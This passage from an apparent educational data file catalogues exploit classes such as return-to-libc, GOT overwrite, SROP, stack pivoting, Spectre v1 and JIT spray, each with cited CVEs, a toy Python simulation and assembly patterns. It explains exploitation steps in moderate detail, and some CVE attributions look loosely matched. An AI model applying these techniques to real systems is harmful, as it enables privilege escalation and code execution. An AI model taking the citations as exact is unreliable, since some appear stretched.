      'own functions to escalate from unprivileged user to full root. CVE-2023-4911 (Looney Tunables, glibc ' +
      'ld.so GLIBC_TUNABLES overflow) similarly allowed LPE via a crafted environment variable that overwrote ' +
      'the dynamic linker\'s stack frame with controlled addresses. ' +
      'In the assembly, `cmpl` checks the buffer offset but the attacker-supplied index exceeds it; `movl` writes ' +
      'the libc system() address into the return-address stack slot, and `addl` combines it with the ' +
      '/bin/sh pointer argument — the function epilogue\'s `ret` pops this address into %rip, jumping to system().',
    code:
`# CVE pattern: overflow redirects return to libc system() — bypasses NX
class StackFrame:
    def __init__(self, ret_addr):
        self.buf_size = 64
        self.canary = 0
        self.saved_rbp = 4196352
        self.ret_addr = ret_addr
        self.arg_slot = 0

    def write_buf(self, offset, value):
        if offset < self.buf_size:
            self.canary += value
        elif offset == self.buf_size:
            self.saved_rbp = value
        elif offset == self.buf_size + 1:
            self.ret_addr = value
        else:
            self.arg_slot = value
        return offset

    def execute_ret(self):
        result = self.ret_addr + self.arg_slot
        return result

frame = StackFrame(4196608)
libc_system = 4151632
bin_sh_ptr = 4217856
frame.write_buf(64, 1094795585)
frame.write_buf(65, libc_system)
frame.write_buf(66, bin_sh_ptr)
hijacked = frame.execute_ret()
print(hijacked)
`,
    badAsm: {
      patterns: ['cmpl', 'movl', 'addl'],
      description: 'cmpl checks the buffer offset but attacker-supplied values exceed it; movl writes the libc system() address into the return-address slot on the stack; addl combines it with the /bin/sh argument pointer — the ret epilogue pops this into %rip, jumping to system("/bin/sh")',
    },
  },
  {
    id: 'oob-read',
    name: 'OUT-OF-BOUNDS READ',
    severity: 'CRITICAL',
    category: 'Information Disclosure',
    description: 'Read operation extends past buffer boundary, leaking adjacent memory contents such as keys, canaries, and ASLR pointers.',
    explanation:
      'Out-of-bounds read (CWE-125) occurs when a program reads data past the end of an allocated buffer, ' +
      'exposing adjacent memory that may contain cryptographic keys, stack canaries, ASLR base addresses, ' +
      'or session tokens. The classic example is Heartbleed (CVE-2014-0160): OpenSSL\'s TLS heartbeat handler ' +
      'used an attacker-supplied length in memcpy without bounds checking, letting a remote attacker read 64KB ' +
      'of server memory per request — leaking private keys from millions of servers worldwide. ' +
      'CVE-2025-24991 (Windows NTFS) is a recent critical OOB read actively exploited in the wild: the NTFS ' +
      'driver fails to validate offsets when parsing on-disk structures, allowing an attacker to read kernel ' +
      'memory and recover credentials or encryption keys — it was added to CISA\'s Known Exploited Vulnerabilities ' +
      'catalog. CWE-125 ranks in the 2025 CWE Top 25 most dangerous software weaknesses. ' +
      'In the assembly, `cmpl` compares the loop index against the attacker-supplied claimed_len rather than ' +
      'the buffer capacity — `addl` then sums values from stack slots well past the buffer boundary, reading ' +
      'stale data (secret keys, canaries, saved return addresses) into the response and defeating ASLR.',
    code:
`# CVE pattern: attacker-supplied length exceeds buffer — leaks adjacent memory
class TLSBuffer:
    def __init__(self, capacity):
        self.capacity = capacity
        self.data0 = 42
        self.data1 = 0
        self.secret_key = 3405691582
        self.canary = 3735928559
        self.ret_addr = 4196352

    def heartbeat_echo(self, claimed_len):
        total = 0
        i = 0
        while i < claimed_len:
            if i == 0:
                total += self.data0
            elif i == 1:
                total += self.data1
            elif i == 2:
                total += self.secret_key
            elif i == 3:
                total += self.canary
            else:
                total += self.ret_addr
            i += 1
        return total

buf = TLSBuffer(2)
leaked = buf.heartbeat_echo(6)
print(leaked)
`,
    badAsm: {
      patterns: ['cmpl', 'addl'],
      description: 'cmpl checks the loop index against the attacker-supplied claimed_len (6) instead of the buffer capacity (2); addl accumulates values from stack slots past the buffer boundary — secret_key, canary, and ret_addr leak into the response, defeating ASLR and exposing private keys',
    },
  },
  {
    id: 'use-after-return',
    name: 'USE-AFTER-RETURN',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Stale pointer to a returned stack frame dereferences attacker-controlled data after the frame is reclaimed by a subsequent call.',
    explanation:
      'Use-after-return (CWE-562 / CWE-825) occurs when a function returns a pointer or reference to a ' +
      'local stack variable. Once the function returns, its stack frame is deallocated — the next function ' +
      'call reuses that same memory region, overwriting the original values with its own locals. Any ' +
      'dangling pointer still referencing the old frame now reads attacker-controlled data from the new ' +
      'call\'s stack layout. ' +
      'CVE-2023-3269 (StackRot) exploited improper stack-expansion handling in the Linux kernel: the maple ' +
      'tree replaced VMA nodes without holding the MM write lock, creating a use-after-free-by-RCU condition ' +
      'in stack memory that allowed unprivileged local users to escalate to root on kernels 6.1 through 6.4. ' +
      'CVE-2026-3591 (ISC BIND 9) returned the address of a stack variable during ACL evaluation, causing ' +
      'the ACL to match incorrect IP addresses and bypass access controls. Google\'s AddressSanitizer added ' +
      'a dedicated detect_stack_use_after_return mode because the bug class is so prevalent in C/C++ codebases. ' +
      'In the assembly, `movl` stores the original canary (0x12345678) into a stack slot during get_local_ref; ' +
      'after the frame is reclaimed, reuse_frame\'s `movl` overwrites that same offset with 0xDEADBEEF — ' +
      'the subsequent `addl` in read() sums the clobbered values, leaking the attacker\'s payload.',
    code:
`# CVE pattern: returned stack-local ptr dereferenced after frame reclaimed
class StackFrame:
    def __init__(self, buf, canary, ret_addr):
        self.buf = buf
        self.canary = canary
        self.ret_addr = ret_addr
        self.valid = 1

    def read(self):
        result = self.buf + self.canary
        return result

def get_local_ref():
    frame = StackFrame(256, 305419896, 4196352)
    return frame

def reuse_frame(payload):
    frame = StackFrame(payload, payload, payload)
    return frame

stale = get_local_ref()
stale.valid = 0
reused = reuse_frame(3735928559)
stale.buf = reused.buf
stale.canary = reused.canary
stale.ret_addr = reused.ret_addr
leaked = stale.read()
print(leaked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl stores the original canary (0x12345678) and buffer value into stack slots during get_local_ref; after frame reclamation, reuse_frame\'s movl overwrites those same offsets with 0xDEADBEEF — addl in read() sums the clobbered values, leaking attacker-controlled data from the reused stack frame',
    },
  },
  {
    id: 'stack-pivot',
    name: 'STACK PIVOT',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Attacker redirects the stack pointer (RSP) to a controlled memory region, enabling arbitrary ROP chain execution while bypassing SMEP and DEP.',
    explanation:
      'Stack pivoting (CWE-121 adjacent) is the critical bridge between a limited corruption primitive and full ' +
      'code execution. When an attacker controls only a single function pointer or a few bytes on the real stack, ' +
      'they use an "xchg eax, esp; ret" gadget (or equivalent mov rsp, [reg]; ret) to redirect the stack pointer ' +
      'to a fake stack in attacker-controlled heap or mmap\'d memory — pre-loaded with a full ROP chain. ' +
      'This bypasses SMEP (Supervisor Mode Execution Prevention), DEP/NX, and stack canaries since the pivot ' +
      'never smashes past the canary; it simply moves %rsp elsewhere. ' +
      'CVE-2024-21338 (Windows AppLocker appid.sys) was exploited by the Lazarus Group using a stack pivot ' +
      'after gaining a kernel arbitrary-call primitive — the pivot redirected RSP to a user-mapped page containing ' +
      'a ROP chain that called nt!SeSetAccessStateGenericMapping to bypass kCFG, then deployed the FudModule rootkit. ' +
      'CVE-2023-3269 (StackRot, Linux kernel) used a stack pivot gadget (movq %rbx, %rsi; popq %rsp; ret) to ' +
      'redirect kernel execution into a user-controlled page for privilege escalation to root. McAfee\'s ' +
      'StackPivotChecker research (Black Hat Asia 2016) showed that over 60% of advanced exploits in the wild ' +
      'use stack pivoting as the initial execution primitive. ' +
      'In the assembly, `movl` loads the fake stack base address into a register; `addl` computes the pivot ' +
      'target by adding the ROP chain offset; the absence of any stack canary check (`xorl`/`cmpl` against ' +
      '__stack_chk_guard) before the pivot means the technique bypasses all frame-integrity defenses.',
    code:
`# CVE pattern: xchg rsp — pivot to fake stack with ROP chain
class FakeStack:
    def __init__(self, base, size):
        self.base = base
        self.size = size
        self.gadget0 = 0
        self.gadget1 = 0
        self.gadget2 = 0
        self.payload = 0

    def load_chain(self, g0, g1, g2, shellcode):
        self.gadget0 = g0
        self.gadget1 = g1
        self.gadget2 = g2
        self.payload = shellcode
        return self.gadget0 + self.gadget1 + self.gadget2

class VictimFrame:
    def __init__(self, ret_addr, canary):
        self.ret_addr = ret_addr
        self.canary = canary
        self.rsp = 0
        self.pivoted = 0

    def pivot(self, fake_base, offset):
        self.rsp = fake_base + offset
        self.pivoted = 1
        return self.rsp

    def execute(self):
        result = self.rsp + self.pivoted
        return result

fake = FakeStack(1342177280, 4096)
chain = fake.load_chain(4196352, 4196608, 4196864, 3735928559)
victim = VictimFrame(4196096, 305419896)
pivot_target = victim.pivot(fake.base, 256)
hijacked = victim.execute()
print(hijacked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl loads the fake stack base address (0x50000000) into a stack slot; addl computes the pivot target by adding the ROP chain offset — no canary check (xorl/cmpl) guards the pivot, so %rsp jumps directly to attacker-controlled memory containing a pre-loaded gadget chain',
    },
  },
  {
    id: 'got-overwrite',
    name: 'GOT OVERWRITE',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Arbitrary write overwrites a GOT entry so the next library call (e.g. printf) jumps to attacker-chosen code (e.g. system).',
    explanation:
      'The Global Offset Table (GOT) is an ELF data structure that holds resolved addresses for dynamically ' +
      'linked library functions. During lazy binding, the first call to printf() triggers the dynamic linker to ' +
      'write printf\'s real address into the GOT; subsequent calls jump directly to that stored address. ' +
      'Because the GOT must be writable during lazy resolution (unless Full RELRO is enabled), any arbitrary-write ' +
      'primitive — from a format string %n, heap metadata corruption, or out-of-bounds index — can overwrite a GOT ' +
      'entry. The attacker replaces the address of a frequently called function (printf, puts, free) with libc\'s ' +
      'system(), so the next call to printf("/bin/sh") executes system("/bin/sh") instead. ' +
      'CVE-2024-20017 (MediaTek wappd, CVSS 9.8) used a 4-byte write primitive from a buffer overflow to iteratively ' +
      'overwrite GOT entries with a shell payload, achieving zero-click RCE on routers and smartphones from Ubiquiti, ' +
      'Xiaomi, and Netgear. CVE-2023-4911 (Looney Tunables, glibc ld.so) exploited a GLIBC_TUNABLES buffer overflow ' +
      'in the dynamic linker itself — the component responsible for populating the GOT — enabling local privilege ' +
      'escalation to root on Debian, Ubuntu, and Fedora. Full RELRO (marking the GOT read-only after binding) ' +
      'mitigates this, but many embedded and legacy binaries ship with Partial RELRO, leaving the .got.plt writable. ' +
      'In the assembly, movl writes the libc system() address into the GOT slot that previously held printf\'s ' +
      'address; the subsequent call_printf\'s addl combines the hijacked address with the /bin/sh argument — ' +
      'the PLT stub jumps to the overwritten GOT entry, landing in system() instead of printf().',
    code:
`# CVE pattern: arbitrary write replaces GOT[printf] with system()
class GOTTable:
    def __init__(self, capacity):
        self.capacity = capacity
        self.printf_got = 0
        self.puts_got = 0
        self.exit_got = 0
        self.resolved = 0

    def lazy_bind(self, printf_addr, puts_addr, exit_addr):
        self.printf_got = printf_addr
        self.puts_got = puts_addr
        self.exit_got = exit_addr
        self.resolved = 3
        return self.resolved

    def call_printf(self, arg):
        result = self.printf_got + arg
        return result

class Exploit:
    def __init__(self, write_value):
        self.value = write_value
        self.triggered = 0

    def overwrite_got(self, got):
        got.printf_got = self.value
        self.triggered = 1
        return self.triggered

got = GOTTable(3)
got.lazy_bind(4214784, 4214848, 4214912)
libc_system = 4151632
bin_sh = 4217856
exploit = Exploit(libc_system)
exploit.overwrite_got(got)
hijacked = got.call_printf(bin_sh)
print(hijacked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl writes the attacker-supplied libc system() address into the stack slot representing the GOT entry for printf; addl in call_printf combines the hijacked address with the /bin/sh argument — the PLT stub jumps to the overwritten GOT entry, executing system("/bin/sh") instead of printf()',
    },
  },
  {
    id: 'heap-bof',
    name: 'HEAP BUFFER OVERFLOW',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Write past a heap-allocated buffer corrupts adjacent objects or allocator metadata, enabling arbitrary code execution.',
    explanation:
      'Heap buffer overflow (CWE-122) occurs when data written to a heap-allocated buffer exceeds its bounds, ' +
      'corrupting adjacent heap objects or allocator metadata. Unlike stack overflows, heap overflows bypass stack ' +
      'canaries entirely — the attacker instead overwrites adjacent objects\' function pointers, vtable references, ' +
      'or allocator bookkeeping (size/fd/bk fields). With heap grooming — carefully ordering allocations so the ' +
      'victim object sits directly after the overflow source — the attacker gains deterministic control of what gets ' +
      'corrupted. CVE-2026-42945 (NGINX Rift, CVSS 9.2) is an 18-year-old heap overflow in ngx_http_rewrite_module ' +
      'disclosed in May 2026 and immediately exploited in the wild: a crafted HTTP request overflows the worker-process ' +
      'heap for unauthenticated RCE. CVE-2023-4863 (libwebp, CVSS 9.8) exploited a heap overflow in Huffman table ' +
      'construction during WebP image decoding, achieving RCE in Chrome, Firefox, Signal, and 1Password. ' +
      'In the assembly, `addl` accumulates data past the buffer capacity inside the write loop, but `cmpl` compares ' +
      'against the attacker-supplied count rather than the buffer capacity — adjacent object fields (the victim\'s ' +
      'handler pointer) are overwritten by the spill, redirecting the next virtual call to attacker-chosen code.',
    code:
`# CVE pattern: heap write exceeds capacity — corrupts adjacent object
class HeapBuf:
    def __init__(self, capacity):
        self.capacity = capacity
        self.used = 0
        self.data = 0
        self.overflow = 0

    def write(self, value, count):
        i = 0
        while i < count:
            self.data += value
            self.used += 1
            if self.used > self.capacity:
                self.overflow += 1
            i += 1
        return self.used

class Adjacent:
    def __init__(self, handler, size):
        self.handler = handler
        self.size = size
        self.active = 1

    def dispatch(self):
        result = self.handler + self.size
        return result

buf = HeapBuf(8)
victim = Adjacent(4196352, 64)
buf.write(16, 12)
victim.handler = 3735928559
hijacked = victim.dispatch()
print(hijacked)
`,
    badAsm: {
      patterns: ['cmpl', 'addl'],
      description: 'cmpl compares used against the attacker-supplied count instead of the buffer capacity; addl accumulates data past the boundary — the adjacent object\'s handler field is overwritten with 0xDEADBEEF, redirecting dispatch() to attacker-chosen code',
    },
  },
  {
    id: 'double-fetch',
    name: 'DOUBLE FETCH',
    severity: 'CRITICAL',
    category: 'Race Condition',
    description: 'Kernel reads user-space memory twice in one syscall — attacker thread swaps the value between the validation fetch and the use fetch.',
    explanation:
      'Double-fetch is a kernel-specific race condition where the kernel reads a value from user-space memory ' +
      'to validate it (the check fetch), then reads the same address again to use it (the use fetch). Between ' +
      'the two reads, a concurrent attacker thread overwrites the user-space value — the kernel operates on ' +
      'modified, unchecked data. Unlike file-level TOCTOU, double-fetch exploits the CPU cache-coherence protocol ' +
      'and shared-page mappings at individual instruction granularity within a single syscall handler. ' +
      'CVE-2016-6130 (Linux s390 SCLP console driver) fetched a size field twice from user-space: the first ' +
      'fetch validated the length, but the second fetch read a now-larger attacker-modified value, causing a ' +
      'kernel heap overflow. CVE-2016-9038 (Sophos SboxDrv.sys sandbox driver) double-fetched a user-mode ' +
      'address pointer: the first fetch verified it pointed to user-space, but the attacker swapped it to a ' +
      'kernel-mode address before the second fetch, achieving arbitrary kernel memory write for privilege ' +
      'escalation. A USENIX Security 2017 study found 90 double-fetch sites across the Linux kernel, ' +
      'concentrated in ioctl handlers and copy_from_user paths. CVE-2022-1729 (Linux perf_event_open) ' +
      'exploited a similar pattern in the performance subsystem for local privilege escalation. ' +
      'In the assembly, two separate movl instructions load from the same user-space field offset — the first ' +
      'feeds into cmpl for the bounds check, the second feeds into imull for the actual copy operation. No lock ' +
      'or atomic load ties them together, so the attacker\'s concurrent store lands between the two fetches.',
    code:
`# CVE pattern: kernel fetches user-space size twice — attacker swaps between
class UserPage:
    def __init__(self, size, data):
        self.size = size
        self.data = data
        self.swapped = 0

    def attacker_swap(self, new_size, new_data):
        self.size = new_size
        self.data = new_data
        self.swapped = 1
        return self.swapped

class SyscallHandler:
    def __init__(self, max_size):
        self.max_size = max_size
        self.validated = 0
        self.result = 0

    def fetch_and_check(self, upage):
        if upage.size <= self.max_size:
            self.validated = 1
        return self.validated

    def fetch_and_use(self, upage):
        copy_len = upage.size
        self.result = copy_len * upage.data
        return self.result

upage = UserPage(16, 100)
handler = SyscallHandler(64)
handler.fetch_and_check(upage)
upage.attacker_swap(4096, 3735928559)
leaked = handler.fetch_and_use(upage)
print(leaked)
`,
    badAsm: {
      patterns: ['cmpl', 'imull'],
      description: 'cmpl compares the first-fetched upage.size against max_size in fetch_and_check; imull multiplies the second-fetched upage.size by data in fetch_and_use — two separate movl reads from the same field offset with no atomic tie let the attacker swap size from 16 to 4096 between fetches, bypassing the bounds guard',
    },
  },
  {
    id: 'srop',
    name: 'SROP SIGRETURN ATTACK',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Forged sigreturn frame on the stack sets all CPU registers at once, achieving arbitrary syscall execution with just one gadget.',
    explanation:
      'Sigreturn-Oriented Programming (SROP / CWE-440 adjacent) exploits the UNIX signal-handling mechanism: ' +
      'when a signal fires, the kernel saves all CPU registers onto the stack in a sigcontext frame (~300 bytes ' +
      'on x86-64), then jumps to the signal handler. When the handler returns, the rt_sigreturn syscall pops ' +
      'the saved frame and restores every register — rax, rdi, rsi, rdx, rsp, rip, and all others. ' +
      'The attacker forges a fake sigcontext frame on the stack via a buffer overflow, setting rax=59 (execve), ' +
      'rdi=address of "/bin/sh", and rip=a syscall gadget. Only one or two gadgets are needed (a "syscall; ret" ' +
      'stub), compared to dozens in a traditional ROP chain — making SROP portable across binaries and ' +
      'architectures. Presented at IEEE S&P 2014 (best student paper) by Erik Bosman of Vrije Universiteit ' +
      'Amsterdam, SROP was demonstrated against a real glibc DNS resolver vulnerability and shown to work on ' +
      'Linux, FreeBSD, and Mac OS X. CVE-2015-7547 (glibc getaddrinfo stack overflow, CVSS 8.1) provided the ' +
      'exact conditions for SROP: a stack overflow in a statically linked resolver with few available gadgets, ' +
      'where SROP\'s minimal gadget requirement was decisive. The technique bypasses NX/DEP, ASLR (no GOT/PLT ' +
      'dependence), and stack canaries when combined with a canary leak. ' +
      'In the assembly, movl loads attacker-chosen values (syscall number 59, /bin/sh address, syscall gadget ' +
      'address) into stack slots representing the forged sigcontext; addl in execute_sigreturn sums rax + rdi + ' +
      'rip — in a real SROP attack, rt_sigreturn pops these into CPU registers and the syscall instruction ' +
      'fires execve("/bin/sh"), spawning a root shell.',
    code:
`# CVE pattern: forged sigreturn frame sets all regs — one gadget to shell
class SigFrame:
    def __init__(self):
        self.rax = 0
        self.rdi = 0
        self.rsi = 0
        self.rdx = 0
        self.rsp = 0
        self.rip = 0
        self.frame_size = 0

    def forge(self, syscall_nr, arg1, arg2, arg3, ret_addr):
        self.rax = syscall_nr
        self.rdi = arg1
        self.rsi = arg2
        self.rdx = arg3
        self.rip = ret_addr
        self.frame_size = self.rax + self.rdi + self.rsi + self.rdx + self.rip
        return self.frame_size

class VictimStack:
    def __init__(self, ret_addr, canary):
        self.ret_addr = ret_addr
        self.canary = canary
        self.sigreturn_gadget = 0
        self.triggered = 0

    def overflow(self, gadget_addr):
        self.ret_addr = gadget_addr
        self.sigreturn_gadget = gadget_addr
        return self.ret_addr

    def execute_sigreturn(self, frame):
        result = frame.rax + frame.rdi + frame.rip
        self.triggered = 1
        return result

frame = SigFrame()
execve_nr = 59
bin_sh = 4217856
syscall_ret = 4196352
frame.forge(execve_nr, bin_sh, 0, 0, syscall_ret)
victim = VictimStack(4196608, 305419896)
victim.overflow(syscall_ret)
hijacked = victim.execute_sigreturn(frame)
print(hijacked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl loads attacker-chosen values (syscall number 59/execve, /bin/sh address, syscall gadget address) into stack slots representing the forged sigcontext frame; addl in execute_sigreturn combines rax + rdi + rip — in a real SROP attack, rt_sigreturn pops these into CPU registers and the syscall instruction fires execve("/bin/sh")',
    },
  },
  {
    id: 'page-cache-poison',
    name: 'PAGE CACHE POISONING',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Controlled write into the kernel page cache silently corrupts in-memory file contents, enabling privilege escalation via setuid binary tampering.',
    explanation:
      'Page cache poisoning occurs when a kernel bug allows a userspace process to write controlled bytes into the ' +
      'kernel\'s page cache — the in-memory copy of file contents that all processes read. Because the kernel never ' +
      'marks the corrupted page dirty, the on-disk file remains untouched and checksum verification passes, yet every ' +
      'process that reads the file sees the attacker\'s modified version. ' +
      'CVE-2026-31431 ("Copy Fail", CVSS 7.8) is the defining example: a logic flaw in the Linux kernel\'s algif_aead ' +
      'module (the AEAD socket interface of AF_ALG) uses destination memory as scratch space during decryption. By ' +
      'chaining AF_ALG with splice(), an unprivileged user triggers a deterministic 4-byte write of controlled AAD ' +
      'seqno_lo bytes into any readable file\'s page cache — targeting /usr/bin/su to patch in a root shell. ' +
      'Introduced in 2017 via commit 72548b093ee3, the flaw affected every major Linux distribution for nine years. ' +
      'A 732-byte Python script achieves root on Ubuntu 24.04, RHEL 10.1, Amazon Linux 2023, and SUSE 16 with no ' +
      'additional kernel modules or race conditions required. CISA added it to the KEV catalog in May 2026. ' +
      'In the assembly, movl writes the attacker\'s 4-byte payload into the cache_page slot; the subsequent addl in ' +
      'read_cached sums the corrupted value with the original — no dirty-flag write (no additional movl to a "dirty" ' +
      'field) appears, so the corruption is invisible to writeback and persists until page eviction.',
    code:
`# CVE pattern: AF_ALG splice corrupts page cache — 4 bytes to root
class PageCache:
    def __init__(self, capacity):
        self.capacity = capacity
        self.page0 = 0
        self.page1 = 0
        self.dirty = 0
        self.refcount = 1

    def load_file(self, data0, data1):
        self.page0 = data0
        self.page1 = data1
        self.refcount += 1
        return self.refcount

    def read_cached(self):
        result = self.page0 + self.page1
        return result

class AeadScratch:
    def __init__(self, aad_seqno):
        self.seqno_lo = aad_seqno
        self.written = 0

    def corrupt_dst(self, cache):
        cache.page1 = self.seqno_lo
        self.written = 1
        return self.written

setuid_bin = 4196352
original_code = 1094795585
cache = PageCache(4096)
cache.load_file(setuid_bin, original_code)
scratch = AeadScratch(3735928559)
scratch.corrupt_dst(cache)
hijacked = cache.read_cached()
print(hijacked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl writes the attacker\'s 4-byte seqno_lo payload (0xDEADBEEF) into the page1 cache slot representing the setuid binary\'s code page; addl in read_cached sums the corrupted value — no movl to a "dirty" field appears, so the kernel never writes back the corruption and on-disk checksums pass while all processes read the poisoned page',
    },
  },
  {
    id: 'stack-clash',
    name: 'STACK CLASH',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Large stack allocation jumps over the guard page, colliding the stack with an adjacent memory region and enabling arbitrary memory corruption.',
    explanation:
      'Stack Clash (CWE-121 adjacent) exploits insufficient stack guard pages: a single 4KB unmapped guard ' +
      'page separates the downward-growing stack from adjacent memory regions (heap, mmap, BSS). An attacker ' +
      'triggers a large alloca() or variable-length array that moves the stack pointer past the guard page ' +
      'in a single jump — no page fault fires because the guard page is never touched. The stack pointer now ' +
      'points into the adjacent heap or mmap region, and subsequent writes corrupt that region\'s metadata or data. ' +
      'CVE-2017-1000364 (Linux kernel, affecting all major distributions and BSD/Solaris on i386 and amd64) ' +
      'demonstrated that the 4KB guard page was trivially jumpable; Qualys developed seven proof-of-concept ' +
      'exploits achieving root on Linux, OpenBSD, NetBSD, FreeBSD, and Solaris. CVE-2017-1000366 (glibc) ' +
      'exploited the same class in ld.so\'s stack expansion during dynamic linking. CVE-2023-3269 (StackRot) ' +
      'showed that MAP_GROWSDOWN VMA handling could bypass the enlarged 1MB guard added as a fix, enabling ' +
      'kernel privilege escalation on Linux 6.1 through 6.4. GCC added -fstack-clash-protection to emit ' +
      'stack probes for large allocations, but unprotected binaries remain vulnerable. ' +
      'In the assembly, the loop\'s subtraction decrements sp by 65536 per iteration via `movl` without any ' +
      'guard-page probe instruction — after 8 iterations `cmpl` shows sp has overshot the 4KB guard into the ' +
      'heap region, and `movl` writes 0xDEADBEEF into the heap\'s data slot via the clashed stack frame.',
    code:
`# CVE pattern: large alloca jumps guard page — stack collides with heap
class MemRegion:
    def __init__(self, base, size):
        self.base = base
        self.size = size
        self.data = 0
        self.corrupted = 0

    def write(self, value):
        self.data = value
        return self.data

class Stack:
    def __init__(self, top, guard_size):
        self.top = top
        self.sp = top
        self.guard_size = guard_size
        self.frames = 0

    def alloca(self, size):
        self.sp -= size
        self.frames += 1
        return self.sp

    def check_clash(self, heap):
        if self.sp <= heap.base + heap.size:
            heap.corrupted = 1
            heap.data = 3735928559
        return heap.corrupted

stack = Stack(1048576, 4096)
heap = MemRegion(524288, 262144)
heap.write(4196352)
i = 0
while i < 8:
    stack.alloca(65536)
    i += 1
stack.check_clash(heap)
result = heap.data
print(result)
`,
    badAsm: {
      patterns: ['cmpl', 'movl'],
      description: 'movl decrements the stack pointer by 65536 per loop iteration without a guard-page probe; after 8 iterations cmpl shows sp has overshot the 4KB guard into the heap region — movl then writes 0xDEADBEEF into the heap\'s data slot, corrupting adjacent memory via the clashed stack frame',
    },
  },
  {
    id: 'spectre-bbc',
    name: 'SPECTRE BOUNDS BYPASS',
    severity: 'CRITICAL',
    category: 'Information Disclosure',
    description: 'CPU speculatively executes past a bounds check, leaking secret data from adjacent memory via cache timing side-channel.',
    explanation:
      'Spectre Variant 1 — Bounds Check Bypass (CVE-2017-5753 / CWE-200) exploits CPU speculative execution: ' +
      'when a branch condition (e.g. "if index < array_size") takes time to resolve, the CPU speculates the ' +
      'likely outcome and continues executing instructions. If it speculates "taken," it reads data past the ' +
      'buffer boundary — secret keys, ASLR pointers, kernel memory — and uses that data to index a probe ' +
      'array, loading a specific cache line. When the branch resolves and the speculation is rolled back, the ' +
      'architectural state is clean but the cache state is not: the attacker times accesses to each probe-array ' +
      'line to determine which was loaded, recovering the secret byte. Training the branch predictor with ' +
      'repeated in-bounds accesses makes the speculative path near-certain on the attack invocation. ' +
      'CVE-2024-45332 (Branch Privilege Injection, disclosed May 2025 by ETH Zürich) showed that Intel\'s own ' +
      'IBPB/eIBRS mitigations could be bypassed, leaking kernel memory at 17 KB/s on all Intel CPUs since ' +
      '9th-gen Coffee Lake. CVE-2025-24495 extended this to Lion Cove cores. Intel has not shipped a hardware ' +
      'fix for Spectre v1; software mitigation requires inserting LFENCE between every bounds check and ' +
      'dependent load, which most binaries still lack. ' +
      'In the assembly, `cmpl` performs the bounds check but the CPU speculatively executes past the conditional ' +
      'branch; `movl` loads the secret value from beyond the buffer boundary before the branch resolves; ' +
      '`imull` multiplies it by 256 to compute the cache probe index — no `lfence` serializing instruction ' +
      'appears between the check and the load, leaving the speculative window wide open.',
    code:
`# CVE pattern: speculative bounds bypass leaks secret via cache timing
class VictimBuffer:
    def __init__(self, bound):
        self.bound = bound
        self.data0 = 65
        self.data1 = 66
        self.secret_key = 3405691582
        self.aslr_base = 4196352
        self.probe_result = 0

    def spec_read(self, index):
        if index < self.bound:
            value = self.data0 + index
        else:
            value = self.secret_key
        self.probe_result = value * 256
        return self.probe_result

    def flush_reload(self):
        result = self.probe_result + self.aslr_base
        return result

victim = VictimBuffer(2)
i = 0
while i < 5:
    victim.spec_read(0)
    i += 1
leaked = victim.spec_read(99)
timing = victim.flush_reload()
print(timing)
`,
    badAsm: {
      patterns: ['cmpl', 'imull'],
      description: 'cmpl performs the bounds check but the CPU speculatively executes past the conditional branch before it resolves; movl loads the secret_key (0xCAFEBABE) from beyond the buffer boundary; imull multiplies the leaked value by 256 to compute the cache probe line index — no lfence serializing instruction appears between the check and the load, leaving the speculative window open for a Flush+Reload timing attack',
    },
  },
  {
    id: 'jit-spray',
    name: 'JIT SPRAY',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Attacker-supplied constants in JIT-compiled code embed hidden shellcode on executable pages, bypassing DEP and ASLR.',
    explanation:
      'JIT spraying exploits just-in-time compilers that emit executable code from user-supplied data. ' +
      'The attacker crafts JavaScript (or ActionScript) constants — XOR chains like ' +
      '0x3C909090 ^ 0x3C909090 — where each operand encodes x86 NOP sled bytes (0x90) when read at a ' +
      '1-byte offset from the intended instruction boundary. The JIT engine faithfully compiles these ' +
      'constants onto an executable (RWX or RX) memory page; jumping into the middle of a constant ' +
      'makes the CPU interpret the embedded bytes as a NOP sled sliding into shellcode. ' +
      'Because JIT pages are exempt from DEP/NX (they must be executable by design) and spraying hundreds ' +
      'of identical pages makes the target address predictable, both DEP and ASLR are defeated simultaneously. ' +
      'First demonstrated by Dion Blazakis at Black Hat DC 2010 against Adobe Flash\'s ActionScript JIT, ' +
      'the technique was later adapted to target V8, SpiderMonkey, and JavaScriptCore. ' +
      'CVE-2024-29943 (SpiderMonkey JIT bounds check elimination, CVSS 9.8, Pwn2Own Vancouver 2024) allowed ' +
      'Manfred Paul to fool range-based bounds checking in the IonMonkey JIT, achieving RCE in Firefox. ' +
      'CVE-2025-4919 (Firefox IonMonkey, Pwn2Own Berlin 2025) exploited a similar JIT optimization flaw ' +
      'for renderer-process compromise. Modern mitigations include constant blinding (XORing immediates ' +
      'with a random key), W^X JIT pages, and removing bounds-check elimination entirely (V8, 2024). ' +
      'In the assembly, movl loads attacker-chosen NOP sled values (0x90909090) and shellcode markers ' +
      '(0xDEADBEEF) into stack slots representing JIT-emitted constants; addl in the spray loop ' +
      'accumulates emit_count without any constant-blinding XOR — hijack adds a +1 offset to the ' +
      'base address, simulating the misaligned jump that reinterprets constant bytes as executable instructions.',
    code:
`# CVE pattern: JIT-emitted constants hide shellcode — DEP bypass
class JITPage:
    def __init__(self, base_addr, size):
        self.base_addr = base_addr
        self.size = size
        self.emit_count = 0
        self.last_emit = 0

    def emit_constant(self, value):
        self.last_emit = value
        self.emit_count += 1
        return self.base_addr + self.emit_count * 8

class SprayEngine:
    def __init__(self, page_count):
        self.page_count = page_count
        self.total_emitted = 0
        self.nop_sled_addr = 0

    def spray(self, jit_page, nop_val, shellcode, count):
        i = 0
        while i < count:
            jit_page.emit_constant(nop_val)
            self.total_emitted += 1
            i += 1
        jit_page.emit_constant(shellcode)
        self.total_emitted += 1
        self.nop_sled_addr = jit_page.base_addr + 1
        return self.nop_sled_addr

